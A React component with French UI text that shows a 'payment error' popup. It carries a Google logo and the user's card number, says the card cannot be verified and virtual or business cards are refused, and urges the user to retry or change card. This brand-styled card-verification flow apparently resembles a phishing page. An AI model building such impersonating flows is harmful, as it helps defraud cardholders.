import React from 'react';
import { createPortal } from 'react-dom';
import PopupHeader from './PopupHeader';
import styles from '../../styles/components/CommonPopup.module.css';

const EndPopup = ({ 
  isVisible, 
  selectedPlan,
  onClose,
  onRetry,
  cardNumber
}) => {
  console.log("EndPopup rendu avec isVisible:", isVisible);
  
  if (!isVisible) return null;

  const popupContent = (
    <div className={styles.popupWrapper}>
      <div className={styles.popup}>
        <PopupHeader 
          showGoogleLogo={true} 
          showCardLogo={true}
          cardNumber={cardNumber}
        />
        
        <div className={styles.content}>
          <div className={styles.iconContainer}>
            <div className={styles.errorIcon}>
              <div className={styles.errorContainer}>
                <svg 
                  className={styles.errorMark} 
                  viewBox="0 0 52 52"
                  width="48" 
                  height="48"
                >
                  <circle 
                    className={styles.errorCircle} 
                    cx="26" 
                    cy="26" 
                    r="25" 
                    fill="none"
                    stroke="#f44336"
                    strokeWidth="2"
                  />
                  <path 
                    className={styles.errorX} 
                    fill="none" 
                    stroke="#f44336"
                    strokeWidth="3"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M16 16l20 20M36 16l-20 20"
                  />
                </svg>
              </div>
            </div>
          </div>
          
          <h3 className={styles.title}>
            Erreur lors du paiement
          </h3>
          
          <p className={styles.subtitle}>
            Votre carte n'est pas prise en charge pour la vérification.
            <br />
            Aucun montant n'a pu être débité de votre carte.
          </p>

          <p className={styles.descriptionNoMargin}>
            Raisons possibles du blocage :
          </p>
          
          <div className={styles.detailsList}>
            <div className={styles.detailItem}>
              <span>💳</span>
              <span>Cartes virtuelles ou Business non-acceptées</span>
            </div>
            <div className={styles.detailItem}>
              <span>🔒</span>
              <span>Transaction bloquée par mesure de sécurité</span>
            </div>
            <div className={styles.detailItem}>
              <span>🔁</span>
              <span>Réessayez ou changez de carte</span>
            </div>
            
          </div>
          
          <div className={styles.buttonContainer}>
            <button 
              onClick={onRetry}
              className={styles.primaryButton}
            >
              Réessayer
            </button>
          </div>
        </div>
      </div>
    </div>
  );

  // Utiliser createPortal pour rendre le popup à la racine du document
  return typeof window !== 'undefined' 
    ? createPortal(popupContent, document.body)
    : null;
};

export default EndPopup;
